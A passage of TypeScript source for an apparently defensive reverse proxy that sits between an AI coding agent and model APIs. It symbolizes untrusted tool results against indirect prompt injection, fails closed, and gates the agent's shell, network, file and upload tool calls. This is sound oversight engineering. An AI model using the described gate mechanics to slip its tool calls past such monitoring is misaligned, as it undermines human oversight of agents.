/**
 * proxy — the Mandu Track A model-API reverse proxy (HTTP server).
 *
 * Mandu Track A (interceptors/anthropic-proxy). A reverse proxy the agent points
 * at via ANTHROPIC_BASE_URL. It forwards to https://api.anthropic.com but
 * transforms POST /v1/messages:
 *
 *   request  (agent→model): rewriteRequest() — classify + symbolize untrusted
 *                           tool_result spans, inject the handling prompt
 *                           (src/rewrite-request.ts). FAILS CLOSED on arbiter err.
 *                           With a view map (P2): AgentView paths in tool_result
 *                           content / echoed tool_use args are reverse-mapped to
 *                           HumanView (src/view-map.ts) after symbolization.
 *   response (model→agent): without a view map, pass bytes through UNCHANGED
 *                           while an SSE sniffer (src/sse-parser.ts) reconstructs
 *                           tool_use blocks and records them via
 *                           arbiter.recordToolCall(). With a view map, tool_use
 *                           path args are forward-mapped HumanView→AgentView
 *                           first (src/sse-rewrite.ts / forwardMapResponseJson)
 *                           and the sniffer taps the rewritten stream.
 *                           Reply row reservation: a token alone on its
 *                           line, or (v2, a relay that wraps) inside a
 *                           line, may reach the agent as an N-row reserve
 *                           block (src/sse-reserve-expand.ts), collapsed back
 *                           on the next request (src/reserve-request.ts;
 *                           docs/design/ui/reply-row-reservation.md).
 *
 * POST /v1/messages/count_tokens runs through the same request rewrite. A
 * bodyless GET/HEAD is relayed verbatim; every other request is refused (403)
 * and never sent (src/route.ts). The upstream transport is injectable
 * (UpstreamFetcher) so tests drive a mock upstream with no network / API key.
 *
 * TRANSIENT THROTTLES: a 429 (rate limit) / 529 (overloaded) from upstream is
 * absorbed with bounded retry + backoff (honoring Retry-After) before the
 * response is committed, so the agent doesn't see "Server is temporarily limiting
 * requests" on every transient spike. After the attempt cap the real status is
 * relayed unchanged (no masking). See `upstreamWithRetry` / RetryOptions.
 *
 * CLOUD MODELS AT A LOCAL UPSTREAM (plan 11 §8 item 3): when the upstream is a
 * main model the operator declared `local: true` (`upstreamLocal`, env
 * MANDU_UPSTREAM_LOCAL=1), a Messages or count_tokens request whose `model` is
 * cloud-backed (Ollama's `:cloud` / `-cloud` tags, src/cloud-model.ts) is
 * answered with a 400 invalid_request_error and nothing is sent: such a model
 * runs on the vendor's servers behind the same loopback API.
 *
 * FAIL-CLOSED (mandu.md invariant / CONTRIBUTING.md): if the request rewrite throws
 * RewriteRefusal (arbiter unreachable or classify/symbolize/handlingPrompt
 * error), we respond 502 and DO NOT forward — un-symbolized untrusted content
 * never reaches the model. recordToolCall failures on the response side are
 * logged but NOT fatal (they degrade OS-interceptor correlation, they do not
 * leak untrusted data into T-LLM).
 */

import { checkLiteralHost, type TlsMaterial, tlsOptions } from "./endpoint-tls.js";
import { createServer, type Server, type IncomingMessage, type ServerResponse } from "node:http";
import { Readable } from "node:stream";

import type { Arbiter, ArbiterEvent, RuleRef } from "./arbiter-client.js";
import { parseApplyPatch, patchWrites } from "./apply-patch.js";
import {
  rewriteRequest,
  RewriteRefusal,
  RewriteBlocked,
  RewriteAbandoned,
  flattenToolResultContent,
  oracleHaystack,
  mustNotSurvive,
  crossResultSpans,
  ownForwardedText,
  HANDLING_MARKER,
  callCommandText,
  type RewriteResult,
} from "./rewrite-request.js";
import { clientGone, PromptBlockLedger, PromptEventLedger, type PromptFilterReport } from "./prompt-filter.js";
import type { TwinHint } from "./twin-note.js";
import { SseToolUseParser, extractToolUsesFromJson, type ReconstructedToolUse } from "./sse-parser.js";
import { SseToolUseRewriter, type ToolInputTransform } from "./sse-rewrite.js";
import { SseTextDeltaRepacker } from "./sse-text-repack.js";
import { SseReserveExpander, ReserveEligibility } from "./sse-reserve-expand.js";
import { parseReserveMax, RESERVE_MAX_ROWS } from "./reserve-block.js";
import { reserveRequestPass, type ReserveRequestPass } from "./reserve-request.js";
import { ChatTextRepacker, ResponsesTextRepacker } from "./text-repack.js";
import { ViewMap, reverseMapRequestPaths } from "./view-map.js";
import { gateToolUseInput } from "./fs-gate.js";
import { labelWrittenPaths } from "./fs-label.js";
import { blockNoticeText, blockSentinelCommand, ExecGateNotices, gateCommandLikeToolUse, gateExecToolUse, isMcpCommandCandidate, plainBlockWords } from "./exec-gate.js";
import { ClearResultLedger, arbiterClearResultStore } from "./after-the-fact.js";
import { ForwardedResultMemory, arbiterPlaceholderStore } from "./openclaw-redaction.js";
import { everyPathDenied, pathDenialNotice, refusalNotice, ResultNotices, type PathDenial } from "./path-denial-notice.js";
import { gateStdinToolUse } from "./stdin-gate.js";
import { gateNetToolUse, NetGateHistory } from "./net-gate.js";
import { GateSurfaceCache, UNION_GATE_SURFACE, type GateSurface } from "./gate-surface.js";
import { gateUploadToolUse, UploadPlans, UPLOAD_HOST, UPLOAD_HOSTS } from "./upload-gate.js";
import { gateUnmappedUploadToolUse, possibleWriter, surfaceNamesTool, withheldPath } from "./unmapped-upload.js";
import { dispatcherRefusalInput, refusedArg, refusedArgInput, refusedTool, refusedToolInput, unwrapDispatch } from "./dispatch.js";
import { classifyRoute, classifyOpenAiRoute, type OpenAiRoute } from "./route.js";
import { substituteAuthHeaders, upstreamDestination } from "./auth-substitution.js";
import { OpenAiWireError, providerSideRefusal, shadowFor, type CallMemory, type OpenAiApi } from "./openai-wire.js";
import { ChatStreamRewriter, ResponsesStreamRewriter, gateChatJson, gateResponsesJson, type CallGate, type ReleasedCall } from "./openai-sse.js";
import { isCloudBackedModel } from "./cloud-model.js";
import { REPLY_MEDIA_TOOL, type ReplyMediaResult } from "./reply-media.js";
import {
  ANTHROPIC_WIRE,
  CHAT_WIRE,
  RESPONSES_WIRE,
  ReplyMediaFilter,
  gateChatJsonReply,
  gateMessagesJsonReply,
  gateResponsesJsonReply,
  type ReplyMediaStreamOptions,
} from "./reply-media-stream.js";
import type { MessagesRequest, Message, ToolResultBlock } from "./messages-types.js";
import { isToolUseBlock } from "./messages-types.js";
import {
  makeClientInfo,
  makeToolSurface,
  type EventContext,
  type SymbolRef,
  type FullInput,
  type FullInputBlock,
  type TllmCallShape,
  makeTllmCall,
  makeToolResult,
  makeSymbolize,
  makeToolUse,
  makeFsGate,
  makeFsLabel,
  makeExecGate,
  makeNetGate,
  makePathRewrite,
  makeReserveResidual,
  makeReserveExpand,
  makePromptFilter,
  symbolRef,
  survivingResult,
} from "./events.js";

/** A minimal upstream response the proxy understands. */
export interface UpstreamResponse {
  status: number;
  headers: Record<string, string | string[] | undefined>;
  /** Response body as a readable byte stream (SSE or buffered JSON). */
  body: Readable;
}

/** Forward a rewritten request upstream. Injectable for tests. */
export type UpstreamFetcher = (args: {
  method: string;
  path: string;
  headers: Record<string, string | string[] | undefined>;
  body: Buffer;
}) => Promise<UpstreamResponse>;

export interface ProxyOptions {
  arbiter: Arbiter;
  /** Upstream transport. Defaults to a real https fetcher to api.anthropic.com. */
  upstream?: UpstreamFetcher;
  /** Upstream origin for the default fetcher. */
  upstreamOrigin?: string;
  /** Optional session key threaded into arbiter calls. */
  sessionKey?: string;
  /** Optional handling-prompt mode. */
  handlingMode?: string;
  /** The session's secret posture (src/secret-posture.ts; env
   *  MANDU_SECRET_POSTURE, set by the launcher), reported with every
   *  handling-prompt request. Absent ⇒ nothing reported (byte-identical). */
  secretPosture?: string;
  /** The net-proxy TLS-inspects this session's non-model HTTPS
   *  (`--net-proxy-mitm`), so a symbol the policy allows inside a WebFetch URL is
   *  released at that chokepoint and the net gate lets the call through with
   *  its symbol. Default false ⇒ such a call is blocked with a reason
   *  (net-gate.ts, the per-symbol leg). */
  netTlsInspected?: boolean;
  /** The upstream is a main model the operator declared `local: true` in
   *  policy.yaml `models:` (the launcher sets MANDU_UPSTREAM_LOCAL=1; plan 11
   *  §8 item 3). A Messages or count_tokens request naming a cloud-backed
   *  model (src/cloud-model.ts) is then refused with a 400 and never sent:
   *  a local server relays such a model to its vendor. Default false. */
  /** Plan 12 D3: the declared main model's `tls:` checks (its CA, pins,
   *  client certificate), applied to every upstream connection
   *  (endpoint-tls.ts; env `MANDU_UPSTREAM_TLS`, set by the launcher). */
  upstreamTls?: TlsMaterial;
  upstreamLocal?: boolean;
  /** Logger; defaults to console.error. Set to a no-op in tests. */
  log?: (msg: string) => void;
  /** Max request body bytes (defense against unbounded buffering). */
  maxBodyBytes?: number;
  /** Bounded retry on transient upstream throttles (429/529). */
  retry?: RetryOptions;
  /** Injectable delay between retries (default real setTimeout); tests pass a fake. */
  sleep?: (ms: number) => Promise<void>;
  /**
   * HumanView↔AgentView prefix map (fs-sync.md §1.3, P2). When active,
   * tool_use path args in the model→agent response are forward-mapped into the
   * AgentView worktree, and AgentView paths in the agent→model request
   * (tool_result content + echoed tool_use args) are reverse-mapped so T-LLM
   * only ever sees HumanView paths. Absent/inactive → both directions pass
   * through exactly as before (byte-verbatim response relay).
   */
  viewMap?: ViewMap;
  /**
   * The HumanView directory the agent was started in (MANDU_AGENT_CWD, set by
   * the launcher only when the agent's argv does not move it). Used ONLY for
   * an agent whose gate surface says it resolves relative paths against that
   * directory (`relativeBase: "launch"`): the sensitive-path gate and the
   * derived label then resolve a relative path against it (fs-gate.ts
   * resolveRelative). Absent or not absolute: the base is unknown.
   */
  agentCwd?: string;
  /**
   * Phase-0 exec gate (exec-routing.md §3). When enabled (DEFAULT), a
   * `Bash`/shell tool_use command in the model→agent response is submitted to
   * the arbiter's `execGate` op; a command carrying an untrusted symbol in
   * command/execution position is rewritten to a benign `exit 77` sentinel on
   * the wire (fail-closed). Independent of the view map. Set false to disable
   * (test-only affordance — verbatim relay of command tool_use).
   */
  execGate?: boolean;
  /**
   * The OpenAI-family providers this session routes through the proxy
   * (agent-e2e-harness.md §9): provider id → that provider's real base URL
   * (e.g. `openai` → `https://api.openai.com/v1`). The agent's provider
   * points at `<proxy>/_mandu/openai/<id>`; requests there are gated
   * (openai-wire.ts, openai-sse.ts) and sent to the base URL. The launcher
   * sets it (MANDU_OPENAI_UPSTREAMS); absent ⇒ every such path is refused.
   */
  openaiUpstreams?: Record<string, string>;
  /** The routed providers whose agent runs a tool call the model WRITES in
   *  its text (Goose's ollama provider): a response whose text carries one
   *  is ended (openai-sse.ts TEXT_CALL_MARK). MANDU_OPENAI_TEXT_CALLS. */
  openaiTextCalls?: readonly string[];
  /** Test seam: the upstream transport per routed provider (default: an
   *  HTTPS fetcher to that provider's base URL, as for the main upstream). */
  openaiFetcher?: (provider: string) => UpstreamFetcher;
  /**
   * Self-describing identity served at `GET /_mandu/identity` so a launcher
   * can verify a listening proxy is THIS session's before adopting it (the
   * start-or-reuse safety check). Carries the security-relevant routing the
   * reuse decision keys on — the arbiter socket (wrong one = wrong symbol
   * table) and the view-map roots (wrong ones = wrong worktree). Absent → the
   * endpoint reports `{ mandu:false }` and a launcher refuses to adopt it.
   */
  identity?: ProxyIdentity;
  /**
   * Reply row reservation (reply-row-reservation.md §3.2, §3.5, §11.4): a
   * token alone on its line whose value has N ≥ 2 lines goes to the agent as
   * an N-row reserve block, when the arbiter reports this session relayed
   * through a PTY by a filter that paints them; with a filter that reports
   * `wrap` and its `cols` (v2), N counts wrapped rows and a token inside a
   * line may expand too. `enabled: false` is the kill
   * switch (server-main: MANDU_REPLY_RESERVE=0); `maxRows` the cap
   * (MANDU_REPLY_RESERVE_MAX, 2..200, default 40). The request-side
   * collapse and strip always run, whatever this says.
   */
  replyReserve?: { enabled?: boolean; maxRows?: number; timeoutMs?: number; relayTtlMs?: number };
}

/** The identity a proxy publishes at `/_mandu/identity` (see ProxyOptions). */
export interface ProxyIdentity {
  /** Which context proxy this is — must match the target the launcher wants. */
  service: "anthropic-proxy" | "openai-proxy";
  /** The per-session scope id (informational; NOT part of the reuse key). */
  sessionKey?: string;
  /** The arbiter Unix socket this proxy symbolizes against (reuse key). */
  arbiterSock?: string;
  /** The HumanView↔AgentView root pairs this proxy routes through (reuse key). */
  viewMap?: Array<{ human: string; agent: string }>;
  /** The agent start directory relative paths resolve against (reuse key:
   *  another launch's directory would place every relative path wrongly). */
  agentCwd?: string;
}

/** How an OpenAI-family route is spelled in the proxy's log. */
const OPENAI_LOG_PREFIX = "/_mandu/openai/";

/** The path the identity endpoint answers on (loopback admin, never forwarded). */
export const IDENTITY_PATH = "/_mandu/identity";

/** Bounded retry policy for transient upstream throttles (429/529). */
export interface RetryOptions {
  /** Total upstream attempts including the first (default 8). */
  maxAttempts?: number;
  /** Base backoff in ms; grows exponentially with full jitter (default 500). */
  baseDelayMs?: number;
  /** Upper bound on any single backoff delay in ms (default 10000). */
  maxDelayMs?: number;
}

const DEFAULT_UPSTREAM_ORIGIN = "https://api.anthropic.com";

/**
 * How the default fetcher reaches an upstream origin (README "Upstream
 * transport"). `https:` → TLS: every real deployment. `http:` → plain HTTP
 * ONLY when the host is a LITERAL loopback address (127.0.0.0/8 or ::1): a
 * stand-in model on this machine, which is how `mandu demo` runs offline with
 * no key (docs/design/distribution/mandu-demo.md §4). Any other `http:` origin, including
 * the NAME `localhost` (a hosts file can point it anywhere), and every other
 * scheme is `refuse`: the default fetcher then answers each request with an
 * error (the proxy's 502) and sends nothing, so the model conversation never
 * crosses a network in the clear. Pure.
 */
export function upstreamTransport(url: URL): "https" | "http" | "refuse" {
  if (url.protocol === "https:") return "https";
  if (url.protocol !== "http:") return "refuse";
  const host = url.hostname.replace(/^\[|\]$/g, "").toLowerCase();
  if (host === "::1") return "http";
  const m = /^127\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(host);
  return m && m.slice(1).every((o) => Number(o) <= 255) ? "http" : "refuse";
}
/** The upstream's path prefix without a trailing slash ("" for an origin).
 *  Pure. */
export function upstreamBasePath(url: URL): string {
  return url.pathname.replace(/\/+$/, "");
}
const DEFAULT_MAX_BODY = 64 * 1024 * 1024; // 64 MiB
/** Ceiling for recording a call's delivered command (plan 13 D9 follow-up);
 *  a slower arbiter leaves the call unbound (masked, fail-closed). */
const DELIVERED_COMMAND_TIMEOUT_MS = 5000;
// Patient by design: the dashboard's "Server is temporarily limiting requests"
// is a SUSTAINED 429 (tens of seconds) while concurrent Claude Code sessions share
// one subscription's short-term rate budget. To shield `claude -p` from it the
// proxy must keep re-knocking long enough for the rate window to reset — up to 12
// attempts with backoff capped at 15s and a delay FLOOR (equal jitter) so the tail
// attempts actually space out, giving a ~1-2 min total budget — before relaying a
// still-failing status. (A run is async in the dashboard, so a slower start beats
// a hard error.)
const DEFAULT_RETRY: Required<RetryOptions> = { maxAttempts: 12, baseDelayMs: 500, maxDelayMs: 15000 };
/**
 * Upstream statuses worth retrying: 429 (rate limit) and 529 (overloaded). Both
 * mean the request was rejected BEFORE the model processed it, so re-sending the
 * identical buffered body is safe even for a POST. Anything else (4xx/5xx) is a
 * genuine error and is relayed to the agent unchanged.
 */
const RETRYABLE_STATUS = new Set([429, 529]);

/** Request headers we accept as a stable session id, in priority order. */
const SESSION_ID_HEADERS = ["x-mandu-session-id", "x-mandu-session", "x-session-id"];
/** Request header carrying a batch id shared by sessions run together (optional);
 *  it rides onto events so the dashboard sidebar can group the batch. */
const BATCH_ID_HEADERS = ["x-mandu-batch-id"];
/** Tenant stamp header (policy-surface.md §2.7); packed like the batch id. */
const TENANT_HEADERS = ["x-mandu-tenant"];

/** Cap the symbolized prompt summary carried in a tllm_call event. */
export const PROMPT_SUMMARY_CAP = 4096;
/**
 * Per-`▸ system` cap, well under PROMPT_SUMMARY_CAP. The agent's own system
 * prompt (e.g. Claude Code's, tens of KB) comes FIRST in the transcript, so
 * without its own cap it consumes the whole PROMPT_SUMMARY_CAP budget and the
 * `▸ user`/`▸ assistant` turns — the human's actual prompt — get truncated off
 * the end. Capping the system block to a small, still-useful excerpt guarantees
 * the conversation turns survive the whole-summary cap. (dashboard.md §4.3)
 */
export const SYSTEM_SUMMARY_CAP = 512;

/**
 * The data the response-side sniffer needs to emit `tool_use` + the final
 * `tllm_call` event for one exchange. Carries the ingress rewrite (for the input
 * DualRepr / symbols / §9 oracle) and the forwarded prompt text.
 */
interface EmitState {
  ctx: EventContext;
  rewritten: RewriteResult;
  forwardedText: string;
  model: string;
}

/** Pull the assistant text blocks from a non-streaming Messages response. */
function extractAssistantText(resp: Record<string, unknown>): string {
  const content = resp["content"];
  if (!Array.isArray(content)) return "";
  const parts: string[] = [];
  for (const b of content) {
    if (b && typeof b === "object" && (b as { type?: string }).type === "text") {
      const t = (b as { text?: unknown }).text;
      if (typeof t === "string") parts.push(t);
    }
  }
  return parts.join("");
}

/** Pull a relayed Anthropic error body (a 429/529 etc.) into a one-line summary
 *  for the tllm_call event: `{type:"error", error:{type, message}}` → "type: message". */
function extractAnthropicError(resp: Record<string, unknown>): string | null {
  const err = resp["error"];
  if (err && typeof err === "object") {
    const e = err as { type?: unknown; message?: unknown };
    const type = typeof e.type === "string" ? e.type : null;
    const message = typeof e.message === "string" ? e.message : null;
    if (type || message) return `${type ?? "error"}${message ? ": " + message : ""}`;
  }
  return null;
}

/** Truncate a string to `max` chars, marking elision (for event summaries). */
function truncate(s: string, max: number): string {
  return s.length <= max ? s : `${s.slice(0, max)}…[+${s.length - max} chars]`;
}

/** Per-message marker for the readable transcript summary (parsed by the
 *  dashboard's transcript renderer — see dashboard/src/transcript.ts). */
const ROLE_MARK = "▸";

/**
 * Collapse the large `<system-reminder>…</system-reminder>` context blocks the
 * harness injects into user turns down to a short `[system-reminder]` marker.
 * This keeps the transcript readable (the actual human prompt isn't buried under
 * a wall of injected context) and — because the summary is length-capped — keeps
 * the real prompt from being truncated off the end by a giant reminder.
 */
function collapseInjectedContext(s: string): string {
  return s.replace(/<system-reminder>[\s\S]*?<\/system-reminder>/gi, "[system-reminder]").trim();
}

/**
 * Flatten one message's content (a string or an array of content blocks) to
 * readable text for the transcript summary: text blocks verbatim, a `tool_use`
 * as `→ name(args)`, a `tool_result` as a labeled block. The text is the
 * already-rewritten (symbolized) request, so any `$MDU:*` survive intact.
 */
function flattenMessageContent(content: Message["content"]): string {
  if (typeof content === "string") return content;
  if (!Array.isArray(content)) return "";
  const parts: string[] = [];
  for (const b of content) {
    const block = (b ?? {}) as Record<string, unknown>;
    if (block.type === "text") {
      parts.push(collapseInjectedContext(String(block.text ?? "")));
    } else if (block.type === "tool_use") {
      let args = "";
      try {
        args = JSON.stringify(block.input ?? {});
      } catch {
        args = "{…}";
      }
      parts.push(`→ ${String(block.name ?? "tool")}(${args})`);
    } else if (block.type === "tool_result") {
      const id = block.tool_use_id ? ` ${String(block.tool_use_id)}` : "";
      parts.push(`[tool_result${id}]\n${flattenToolResultContent(block.content as ToolResultBlock["content"])}`);
    } else {
      parts.push(`[${String(block.type ?? "block")}]`);
    }
  }
  return parts.join("\n");
}

/**
 * Build the readable, symbolized transcript carried in the `tllm_call` event's
 * input DualRepr — the system prompt plus every message as a `▸ role` block.
 * This REPLACES the previous raw `JSON.stringify(request)` dump, which rendered
 * as an unreadable JSON blob in the dashboard's detail pane. The Mandu IPI
 * handling system block is collapsed to a short placeholder so it doesn't drown
 * the agent's own system prompt. The raw forwarded bytes are still checked for
 * un-symbolized leaks by the §9 oracle separately (`forwardedText`).
 */
function summarizeRequest(req: MessagesRequest): string {
  const blocks: string[] = [];
  const sys = req.system;
  const sysBlocks =
    typeof sys === "string"
      ? [sys]
      : Array.isArray(sys)
        ? sys.map((b) => String((b as { text?: unknown }).text ?? ""))
        : [];
  const sysText = sysBlocks
    .map((t) => (t.includes(HANDLING_MARKER) ? "[Mandu IPI handling prompt]" : t))
    .filter((t) => t.trim())
    .join("\n");
  // Cap the system block on its own (SYSTEM_SUMMARY_CAP) so the agent's giant
  // system prompt can't swallow the whole-summary budget and truncate the user's
  // prompt off the end — the dashboard's "mostly system prompts" bug.
  if (sysText.trim()) blocks.push(`${ROLE_MARK} system\n${truncate(sysText.trim(), SYSTEM_SUMMARY_CAP)}`);
  for (const m of req.messages ?? []) {
    blocks.push(`${ROLE_MARK} ${m.role}\n${flattenMessageContent(m.content)}`);
  }
  return fitBlocks(blocks, PROMPT_SUMMARY_CAP).join(BLOCK_SEP);
}

const BLOCK_SEP = "\n\n";

/**
 * Fit the transcript's `▸` blocks into `cap` chars so that EVERY block
 * survives — the longest blocks are elided first (water-filling: find the
 * largest per-block length L such that Σ min(len, L) fits, then cut every
 * block longer than L). The whole-summary tail truncation this replaces cut
 * the transcript wherever the budget ran out, and one giant early message
 * dropped every later turn: live (2026-09-05, interactive-smoke@fable) Claude
 * Code's first user message under Fable carried ~10 KB of un-collapsed
 * instructions, so the typeahead call's trailing "[SUGGESTION MODE: …]" user
 * message never reached the summary — the dashboard's side-call classifier
 * (dual-lanes.ts isSideCall, string shape) saw a tool-carrying call with no
 * recognizable instruction, minted no input card for the second prompt and let
 * the SUGGESTION steal the delivered reply. A prompt list is only a prompt
 * list if every prompt is in it; the head of each block is what the dashboard
 * keys on (prompt cards, side-call shapes), so heads are what survive.
 * Exported for tests.
 */
export function fitBlocks(blocks: string[], cap: number): string[] {
  const sep = BLOCK_SEP.length * Math.max(0, blocks.length - 1);
  const total = blocks.reduce((n, b) => n + b.length, 0) + sep;
  if (total <= cap) return blocks;
  // Elision marker overhead per cut block, bounded (the digit count is small).
  const MARK = 24;
  const fits = (L: number): boolean =>
    blocks.reduce((n, b) => n + (b.length > L ? L + MARK : b.length), 0) + sep <= cap;
  let lo = 0;
  let hi = Math.max(...blocks.map((b) => b.length));
  if (!fits(lo)) {
    // Even one-line heads do not fit (pathological block count): fall back to
    // the old tail truncation on the joined text — never throw on the event path.
    return [truncate(blocks.join(BLOCK_SEP), cap)];
  }
  while (lo < hi) {
    const mid = Math.ceil((lo + hi) / 2);
    if (fits(mid)) lo = mid;
    else hi = mid - 1;
  }
  return blocks.map((b) => (b.length > lo ? truncate(b, lo) : b));
}

/**
 * Compute the structural shape of the forwarded request for the `tllm_call`
 * event — the dashboard's side-call detection seam (dashboard.md §4.2c). The
 * agent conversation loop always carries the agent's tool battery; every known
 * harness side call (title gen, the quota probe, typeahead, away-recap, the
 * WebFetch summarizer) sends ZERO tools — so `toolCount` separates them
 * structurally, robust to a Claude Code release rewording the prompts the
 * dashboard's string heuristics key on. `max_tokens` rides through the request's
 * index signature; anything non-numeric records as null (never coerced).
 */
function requestCallShape(req: MessagesRequest): TllmCallShape {
  const maxTokens = req["max_tokens"];
  return {
    toolCount: Array.isArray(req.tools) ? req.tools.length : 0,
    maxTokens: typeof maxTokens === "number" ? maxTokens : null,
    userMessages: (req.messages ?? []).filter((m) => m.role === "user").length,
  };
}

/** Coerce a message role onto a FullInputBlock role (anything other than the
 *  known model roles renders as "user" — the API accepts user/assistant only). */
function fullInputRole(role: string): "user" | "assistant" {
  return role === "assistant" ? "assistant" : "user";
}

/**
 * Build the COMPLETE, untruncated structured input to the model call, each block
 * tagged by source — the on-demand companion to the capped `summarizeRequest`.
 * The dashboard reveals the full prompt from this and HIGHLIGHTS the Mandu
 * injection. Walks the SAME (already-symbolized) `req` the proxy forwards:
 *
 *   - each `system` block: the one whose text carries HANDLING_MARKER is the
 *     Mandu-injected handling prompt → source "mandu" with its FULL text (NOT
 *     the `[Mandu IPI handling prompt]` placeholder summarizeRequest uses); any
 *     other system block → source "agent". Order is preserved (agent blocks
 *     first, mandu last, as rewriteRequest appends it).
 *   - each message → a block with its role; a `user` message that is a tool_result
 *     becomes role "tool_result" with a `tool_result <tool_use_id>` label, its
 *     text the SYMBOLIZED content T-LLM saw (reusing the same flattening as
 *     summarizeRequest so the text matches exactly). Nothing is truncated.
 *
 * SECURITY: `req` is the rewritten (symbolized) request — untrusted spans are
 * already `$MDU:*`. This captures what T-LLM actually received, so it
 * introduces NO new raw-leak surface.
 */
export function buildFullInput(req: MessagesRequest): FullInput {
  const blocks: FullInputBlock[] = [];

  const sys = req.system;
  const sysTexts =
    typeof sys === "string"
      ? [sys]
      : Array.isArray(sys)
        ? sys.map((b) => String((b as { text?: unknown }).text ?? ""))
        : [];
  for (const text of sysTexts) {
    if (!text.trim()) continue;
    const isMandu = text.includes(HANDLING_MARKER);
    blocks.push({ role: "system", source: isMandu ? "mandu" : "agent", text });
  }

  for (const m of req.messages ?? []) {
    // A user message carrying a tool_result is the ingress of a tool's output back
    // into context — label + role it as such; its text is the symbolized content.
    if (m.role === "user" && Array.isArray(m.content)) {
      const trs = m.content.filter((b): b is ToolResultBlock =>
        !!b && typeof b === "object" && (b as { type?: string }).type === "tool_result",
      );
      if (trs.length > 0) {
        for (const tr of trs) {
          const id = tr.tool_use_id ? ` ${String(tr.tool_use_id)}` : "";
          blocks.push({
            role: "tool_result",
            source: "conversation",
            label: `tool_result${id}`.trim(),
            text: flattenToolResultContent(tr.content),
          });
        }
        // Any non-tool_result blocks in the same message (text alongside a result)
        // still carry as the user turn so nothing is dropped.
        const nonTr = m.content.filter(
          (b) => !(b && typeof b === "object" && (b as { type?: string }).type === "tool_result"),
        );
        if (nonTr.length > 0) {
          blocks.push({ role: "user", source: "conversation", text: flattenMessageContent(nonTr) });
        }
        continue;
      }
    }
    blocks.push({
      role: fullInputRole(m.role),
      source: "conversation",
      text: flattenMessageContent(m.content),
    });
  }

  return { blocks };
}

/**
 * Make a header-supplied session id safe to use as the arbiter's per-session
 * NDJSON filename component (mirrors arbiter EventStore `isSafeSessionId`):
 * strip path separators / NUL, cap length, and replace the reserved "."/".."
 * forms. Defense in depth — the arbiter also validates — so a malformed header
 * still yields a usable, capturable session id rather than silently dropping
 * every event for that session.
 */
function sanitizeSessionId(s: string): string {
  const cleaned = s.replace(/[/\\\0]/g, "_").slice(0, 256);
  return cleaned === "" || cleaned === "." || cleaned === ".." ? "_sess" : cleaned;
}

/** Case-insensitive header lookup over a header bag, returning the first value. */
function headerValue(
  headers: Record<string, string | string[] | undefined>,
  name: string,
): string | undefined {
  const lname = name.toLowerCase();
  for (const [k, v] of Object.entries(headers)) {
    if (k.toLowerCase() === lname) {
      return Array.isArray(v) ? v[0] : v;
    }
  }
  return undefined;
}

/** Parse a Retry-After header (delta-seconds or HTTP-date) to ms, or null. */
function parseRetryAfter(headers: Record<string, string | string[] | undefined>): number | null {
  const raw = headerValue(headers, "retry-after");
  if (!raw) return null;
  const s = raw.trim();
  if (/^\d+$/.test(s)) return Number(s) * 1000;
  const when = Date.parse(s);
  return Number.isNaN(when) ? null : Math.max(0, when - Date.now());
}

/**
 * Backoff delay (ms) before the next attempt (`attempt` is 1-based, the attempt
 * that just failed): honor a server Retry-After when present, else exponential
 * backoff with full jitter (random in [0, ceil]) to de-correlate concurrent
 * clients. Both are clamped to `maxDelayMs`.
 */
function retryDelayMs(
  headers: Record<string, string | string[] | undefined>,
  attempt: number,
  cfg: Required<RetryOptions>,
): number {
  const ra = parseRetryAfter(headers);
  if (ra !== null) return Math.min(ra, cfg.maxDelayMs);
  const ceil = Math.min(cfg.baseDelayMs * 2 ** (attempt - 1), cfg.maxDelayMs);
  // Equal jitter: a floor of ceil/2 plus random up to ceil/2. The floor matters —
  // it stops a long tail of capped attempts from collapsing to near-zero delays
  // (pure full-jitter), so the retry budget actually spans the rate-limit window.
  return Math.floor(ceil / 2 + Math.random() * (ceil / 2));
}

export class AnthropicProxy {
  private readonly arbiter: Arbiter;
  private readonly upstream: UpstreamFetcher;
  private readonly upstreamOrigin: string;
  private readonly sessionKey?: string;
  private readonly handlingMode?: string;
  private readonly secretPosture?: string;
  private readonly netTlsInspected: boolean;
  private readonly upstreamLocal: boolean;
  private readonly log: (msg: string) => void;
  private readonly maxBodyBytes: number;
  private readonly retry: Required<RetryOptions>;
  private readonly sleep: (ms: number) => Promise<void>;
  /** Active HumanView↔AgentView prefix map, or null (no rewriting). */
  private readonly viewMap: ViewMap | null;
  /** ProxyOptions.agentCwd when absolute, else undefined (unknown). */
  private readonly agentCwd: string | undefined;
  /** The exec box's twin hints by tool_use id (symbol-twin-shell-blindness.md
   *  §4.1 v2) — see RewriteOptions.twinHintCache for why it must outlive one
   *  request. */
  private readonly twinHintCache = new Map<string, TwinHint[]>();
  /** The model's own input for every net-gate-blocked call, put back into the
   *  history T-LLM reads (net-gate.ts NetGateHistory; confidentiality.md §4). */
  private readonly netGateHistory = new NetGateHistory();
  /** The upload directory of every DesignSync plan relayed (upload-gate.ts). */
  private readonly uploadPlans = new UploadPlans();
  /** The exec gate's block notices by tool_use id: a result that is exactly
   *  its call's notice reaches the model in clear (exec-gate.ts
   *  ExecGateNotices; confidentiality plan 10 §11.8). */
  private readonly execGateNotices = new ExecGateNotices();
  /** The notices for calls whose every path Mandu denied, by tool_use id:
   *  the result is replaced by the notice (path-denial-notice.ts;
   *  confidentiality plan 10 §11.8). */
  private readonly resultNotices = new ResultNotices();
  /** The tool_use ids whose result body went to the model in clear: a result
   *  masked later gets the "masked after the fact" note (after-the-fact.ts;
   *  confidentiality.md §7.1). */
  private readonly clearResults: ClearResultLedger;
  /** What went to the model in clear, by tool_use id, to put back where
   *  OpenClaw's own history redaction rewrote it (openclaw-redaction.ts),
   *  with its placeholder records kept in the arbiter for a relaunch. */
  private readonly forwardedResults: ForwardedResultMemory;
  /** The per-agent gate surface, per session (gate-surface.ts): which tools
   *  the exec / net / fs gates read, and from which field. */
  private readonly gateSurfaces: GateSurfaceCache;
  /** Phase-0 exec gate on/off (exec-routing.md §3). Default on. */
  private readonly execGateEnabled: boolean;
  /** Self-describing identity for the launcher's reuse safety check, or null. */
  private readonly identity: ProxyIdentity | null;
  /** Routed OpenAI-family providers → base URL (ProxyOptions.openaiUpstreams). */
  private readonly openaiUpstreams: ReadonlyMap<string, string>;
  /** ProxyOptions.openaiTextCalls. */
  private readonly openaiTextCalls: ReadonlySet<string>;
  private readonly openaiFetcherFor: (provider: string) => UpstreamFetcher;
  private readonly openaiFetchers = new Map<string, UpstreamFetcher>();
  /** Every call released on an OpenAI wire, by call id (openai-wire.ts
   *  CONTINUATIONS): a Responses continuation's result is classified as the
